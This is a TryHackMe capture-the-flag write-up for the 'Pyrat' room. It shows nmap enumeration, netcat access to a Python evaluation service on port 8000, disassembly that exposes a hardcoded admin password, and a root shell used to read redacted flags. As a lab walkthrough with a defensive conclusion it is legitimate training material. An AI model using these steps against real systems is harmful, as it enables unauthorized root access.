# Pyrat — Write-up

**Platform:** TryHackMe  
**Room:** Pyrat  
**Difficulty:** Easy  
**Estimated Time:** ~60 minutes  

**Description**  
This room focuses on enumeration leading to an unusual service on port **8000** that behaves like an HTTP endpoint but also accepts **raw socket** input. The exposed behavior can be leveraged to reach an **administrative function** and obtain **root-level command execution**, followed by flag retrieval.

---

## Attack Path Overview

- Identify exposed services (SSH + port 8000).
- Confirm the port 8000 service accepts raw socket input and evaluates expressions.
- Inspect execution context to enumerate callable objects.
- Identify and satisfy the admin gate (`get_admin`) using the recovered password.
- Drop into the built-in `shell` flow and retrieve flags.

---

## 1. Initial Enumeration

### 1.1 Nmap

#### Basic TCP scan

```bash
nmap -n -Pn -T4 "$target_ip"
```

<details>
<summary><strong>Raw output</strong></summary>

```text
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-14 09:10 -0300
Nmap scan report for 10.65.139.64
Host is up (0.16s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
8000/tcp open  http-alt
```
</details>

#### Version and default script scan

```bash
nmap -n -Pn -T4 -sC -sV -p 22,8000 "$target_ip"
```

<details>
<summary><strong>Raw output</strong></summary>

```text
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
8000/tcp open  http-alt SimpleHTTP/0.6 Python/3.11.2
```
</details>

### 1.2 Service validation (HTTP vs raw socket)

#### Basic HTTP request

```bash
curl "http://$target_ip:8000"
```

Observed response:

```text
Try a more basic connection
```

#### Raw socket interaction (Netcat)

```bash
nc "$target_ip" 8000
1+1
print(1+1)
2
```

**Interpretation (from observed behavior):**
- The service on port 8000 responds to raw input and returns evaluated output.
- It appears to wrap or evaluate user-provided input in a Python execution context.

> ⚠️ Consistency note: Nmap fingerprints the service as `Python/3.11.2`, while later introspection output references `/usr/lib/python3.8/...`. This discrepancy can occur due to banner/fingerprint limitations, packaging/runtime differences, or mixed environments. The write-up therefore avoids assuming a specific interpreter version beyond what was directly observed.

---

## 2. Execution Context Inspection

To understand the service internals, the global namespace was printed.

```text
nc "$target_ip" 8000
print(globals())
```

<details>
<summary><strong>Observed output (truncated for readability)</strong></summary>

```text
{
  '__name__': '__main__',
  '__file__': '/root/pyrat.py',
  'os': <module 'os' from '/usr/lib/python3.8/os.py'>,
  'sys': <module 'sys' (built-in)>,
  'handle_client': <function handle_client ...>,
  'exec_python': <function exec_python ...>,
  'get_admin': <function get_admin ...>,
  'shell': <function shell ...>,
  'is_http': <function is_http ...>,
  'fake_http': <function fake_http ...>,
  'host': '0.0.0.0',
  'port': 8000,
  ...
}
```
</details>

**Key takeaway:** execution occurs in the main context and exposes multiple helper functions that likely implement the “fake HTTP” and “admin/shell” logic.

---

## 3. Admin Gate Discovery (get_admin)

A direct call to `get_admin()` failed due to a missing socket argument:

```text
get_admin() missing 1 required positional argument: 'client_socket'
```

This strongly suggests `get_admin()` expects the active connection object and is intended to be invoked through a particular input flow (rather than as a standalone function call).

---

## 4. Static Logic Confirmation (Minimal Disassembly)

To understand the admin gate, a minimal disassembly was performed. Only the relevant indicators are shown below.

```text
import dis; dis.dis(get_admin)
```

<details>
<summary><strong>Relevant excerpts</strong></summary>

```text
... 
LOAD_CONST ('Start a fresh client to begin.')
...
LOAD_CONST ('abc123')          # hardcoded password observed in disassembly
...
LOAD_CONST ('Password:')
...
LOAD_CONST ('Welcome Admin!!! Type "shell" to begin')
...
```
</details>

**Interpretation:**  
The function contains a hardcoded admin password and requires a “fresh client” flow. Once validated, it appends the socket to an admin list and enables access to the `shell` functionality.

> For public sharing and OPSEC hygiene, the password is redacted in the exploitation steps below. The room can still be reproduced by following the same flow with the recovered value.

---

## 5. Exploitation: Admin Login → Root Shell

Reconnect with a **fresh** Netcat session and follow the admin prompt flow.

```text
nc "$target_ip" 8000
admin
Password:
[REDACTED]
Welcome Admin!!! Type "shell" to begin
shell
# id
uid=0(root) gid=0(root) groups=0(root)
```

At this point, the service provides a root shell directly inside the challenge environment.

---

## 6. Flag Retrieval

### 6.1 User flag

```text
# cd /home
# ls
think  ubuntu
# cd think
# ls
snap  user.txt
# cat user.txt
THM{REDACTED}
```

### 6.2 Root flag

```text
# cd /root
# ls
pyrat.py  root.txt  snap
# cat root.txt
THM{REDACTED}
```

---

## Conclusion

This room demonstrates how non-standard services can masquerade as HTTP while exposing raw socket-driven logic. Through careful enumeration and introspection, it is possible to identify hidden admin gates and pivot into privileged execution paths. The most critical issue is the combination of:

- an exposed interactive evaluation context,
- a hardcoded password in application logic,
- and a built-in privileged shell path without defense-in-depth.

---

Written by Nelson Hirt
